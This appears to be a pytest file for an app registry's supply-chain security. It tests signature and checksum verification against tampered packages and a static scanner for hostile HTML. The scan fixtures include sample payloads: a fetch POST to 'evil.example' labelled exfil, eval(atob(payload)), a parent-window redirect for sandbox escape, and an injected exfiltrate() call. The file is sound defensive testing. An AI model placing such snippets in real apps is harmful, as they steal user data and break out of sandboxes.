"""The app registry's supply chain: checksum, signature, and the scan under both.

The claim "this is a verified manifest" has to survive an adversary who can edit
any byte of the package — including the security verdict itself. These tests are
therefore mostly attacks: every mutation of a signed package must land in one of
the two hostile statuses, and nothing may drift between the server's checksum and
the registry tooling's, because a signature is over that exact string.
"""

import copy
import json
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from agentos import appregistry as reg                             # noqa: E402


def _pkg(html="<div><script>appData.save({})</script></div>", scanned=True):
    man = {"format": 1, "name": "Hello Notes", "description": "notes",
           "permissions": [{"action": "app.data.write", "resource": "app:self/data",
                            "reason": "save notes", "required": True}],
           "prerequisites": {}}
    if scanned:
        man["security"] = reg.scan_block(html)
    return {"format": reg.PACKAGE_FORMAT, "manifest": man, "html": html,
            "checksum": reg.package_checksum(man, html), "signature": None}


@pytest.fixture()
def keypair(tmp_path):
    path, key_id, pub = reg.keygen(tmp_path / "signing.key")
    return path, key_id, pub


# ------------------------------------------------------------ the happy path

def test_sign_then_verify_roundtrip(keypair):
    path, key_id, pub = keypair
    signed = reg.sign_package(_pkg(), path)
    status, why = reg.verify_package(signed, {key_id: pub})
    assert status == "verified" and key_id in why


def test_an_unsigned_package_is_unsigned_not_hostile(keypair):
    """Your own exports are unsigned and installing them is fine — 'unsigned' must
    stay distinct from the two statuses that mean 'do not install'."""
    _, key_id, pub = keypair
    status, _ = reg.verify_package(_pkg(), {key_id: pub})
    assert status == "unsigned"


# ------------------------------------------------------------ the attacks

def test_every_byte_of_a_signed_package_is_load_bearing(keypair):
    """Edit the html, the permissions, or the SCAN VERDICT of a signed package and
    the verification must fail. The verdict case is the whole reason the security
    block lives inside the manifest: a verdict outside the checksum could be
    upgraded from 'caution' to 'pass' by anyone with a text editor."""
    path, key_id, pub = keypair
    signed = reg.sign_package(_pkg(), path)
    keys = {key_id: pub}

    tampered_html = dict(signed, html=signed["html"] + "<!-- payload -->")
    assert reg.verify_package(tampered_html, keys)[0] == "checksum-mismatch"

    worse_perms = copy.deepcopy(signed)
    worse_perms["manifest"]["permissions"].append(
        {"action": "tool.use", "resource": "tool:run_command*", "required": True})
    assert reg.verify_package(worse_perms, keys)[0] == "checksum-mismatch"

    # laundering needs a package whose verdict is actually bad, or the "edit" is a
    # no-op that (correctly) still verifies — which is what this test's first
    # draft got wrong and the failure taught
    risky = reg.sign_package(_pkg(html="<script>eval(x)</script>"), path)
    assert risky["manifest"]["security"]["verdict"] == "caution"
    laundered = copy.deepcopy(risky)
    laundered["manifest"]["security"]["verdict"] = "pass"
    assert reg.verify_package(laundered, keys)[0] == "checksum-mismatch"


def test_a_recomputed_checksum_does_not_resurrect_a_signature(keypair):
    """The smarter attacker recomputes the checksum after editing. The signature is
    over the checksum string, so a NEW checksum means the old signature cannot
    match — this is the line between 'integrity' and 'authenticity'."""
    path, key_id, pub = keypair
    signed = reg.sign_package(_pkg(), path)
    evil = copy.deepcopy(signed)
    evil["html"] += "<script>exfiltrate()</script>"
    evil["checksum"] = reg.package_checksum(evil["manifest"], evil["html"])
    assert reg.verify_package(evil, {key_id: pub})[0] == "bad-signature"


def test_a_key_this_machine_does_not_trust_is_named_not_trusted(keypair, tmp_path):
    path, key_id, pub = keypair
    signed = reg.sign_package(_pkg(), path)
    status, why = reg.verify_package(signed, {})           # nothing pinned
    assert status == "unknown-key" and signed["signature"]["key_id"] in why
    # …and a DIFFERENT key under the same id must not verify
    _, _, other_pub = reg.keygen(tmp_path / "other.key")
    assert reg.verify_package(signed, {key_id: other_pub})[0] == "bad-signature"


def test_config_can_add_trusted_keys_but_never_remove_builtins(monkeypatch):
    monkeypatch.setattr(reg, "BUILTIN_KEYS", {"reg-official": "AAAA"})
    keys = reg.trusted_keys({"registry": {"keys": {"reg-mine": "BBBB",
                                                   "reg-official": "EVIL"}}})
    assert keys["reg-mine"] == "BBBB"
    assert keys["reg-official"] == "AAAA", \
        "a config entry shadowed a built-in key — that is how a compromised config " \
        "would substitute its own publisher for the official one"


def test_keygen_refuses_to_overwrite_the_identity(tmp_path):
    reg.keygen(tmp_path / "k")
    with pytest.raises(FileExistsError):
        reg.keygen(tmp_path / "k")


# ------------------------------------------------------------ the scan

def test_the_scan_catches_the_classics():
    for html, why in (
        ("<script>window.parent.location='http://x'</script>", "sandbox escape"),
        ("<script>eval(atob(payload))</script>", "eval"),
        ("<script>fetch('https://evil.example/c',{method:'POST'})</script>", "exfil"),
    ):
        findings = reg.static_scan(html)
        assert findings, f"nothing flagged for: {why}"
        assert reg.verdict_of(findings) == "caution"


def test_a_boring_app_passes_clean():
    html = "<div><input id=t><script>appData.save({t:1});appTool('fetch_url',{url:u})</script></div>"
    block = reg.scan_block(html)
    assert block["verdict"] == "pass"
    assert all(f["severity"] == "info" for f in block["findings"])


def test_the_verdict_travels_under_the_signature(keypair):
    """The end-to-end property everything above serves: install-side code can trust
    manifest.security exactly as far as it trusts the signature, no further."""
    path, key_id, pub = keypair
    pkg = _pkg(html="<script>eval(x)</script>")
    assert pkg["manifest"]["security"]["verdict"] == "caution"
    signed = reg.sign_package(pkg, path)
    assert reg.verify_package(signed, {key_id: pub})[0] == "verified"
    assert signed["manifest"]["security"]["verdict"] == "caution", \
        "signing must never touch the verdict it vouches for"


# ------------------------------------------------------------ the index

def test_an_index_entry_reports_verified_and_permissions_honestly(keypair):
    path, key_id, pub = keypair
    signed = reg.sign_package(_pkg(), path)
    e = reg.index_entry(signed, "apps/hello-notes/hello-notes.agentapp.json",
                        {key_id: pub})
    assert e["verified"] is True
    assert e["id"] == "hello-notes"
    assert e["url"].startswith("https://raw.githubusercontent.com/")
    assert e["permissions"] == ["app.data.write"]
    e2 = reg.index_entry(_pkg(), "apps/x/x.agentapp.json", {key_id: pub})
    assert e2["verified"] is False, "an unsigned package must never be listed as verified"


def test_the_server_and_the_registry_share_one_checksum():
    """Two definitions of the canonical form is how every valid package on one side
    becomes a checksum-mismatch on the other. The server must import this module's."""
    src = (Path(__file__).resolve().parent.parent / "agentos" / "server.py").read_text()
    assert "from .appregistry import canonical as _canonical" in src
    assert "from .appregistry import package_checksum as _package_checksum" in src
    assert src.count("sha256:" ) < 3, "a second inline checksum definition crept in"
